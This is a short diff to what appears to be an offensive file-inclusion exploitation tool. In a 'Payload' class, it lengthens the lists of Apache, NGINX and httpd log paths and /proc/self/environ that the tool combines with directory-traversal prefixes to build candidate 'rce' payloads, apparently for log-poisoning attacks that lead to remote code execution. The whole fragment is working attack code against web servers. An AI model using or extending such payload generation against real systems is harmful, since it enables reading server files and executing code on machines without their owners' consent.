@@ -305,7 +305,7 @@ class Payload:
 			if self.verbosity > 1:
 				print(colored('[*]', 'yellow', attrs=['bold']) + ' Server Identified as Apache2')
 			# Apache logs
-			logPath = [quote("/var/log/apache2/access.log"), quote("/var/log/sshd.log"), quote("/var/log/mail"), quote("/var/log/vsftpd.log"), quote("/proc/self/environ")]
+			logPath = [quote("/var/log/apache2/access.log"), quote("/var/log/apache/access.log"), quote("/var/log/apache2/error.log"), quote("/var/log/apache/error.log"), quote("/usr/local/apache/log/error_log"), quote("/usr/local/apache2/log/error_log"), quote("/var/log/sshd.log"), quote("/var/log/mail"), quote("/var/log/vsftpd.log"), quote("/proc/self/environ")]
 			rce = []
 			for d_path in self.linux_dirTraversal:
 				for l_path in logPath:
@@ -328,7 +328,7 @@ class Payload:
 			# Nginx logs
 			if self.verbosity > 1:
 				print(colored('[*]', 'yellow', attrs=['bold']) + ' Server Identified as NGINX')
-			log = [quote("/var/log/nginx/error.log"), quote("/var/log/nginx/access.log")]
+			log = [quote("/var/log/nginx/error.log"), quote("/var/log/nginx/access.log"), quote("/var/log/httpd/error_log")]
 			rce = []
 			for d_path in self.linux_dirTraversal:
 				for l_path in log:
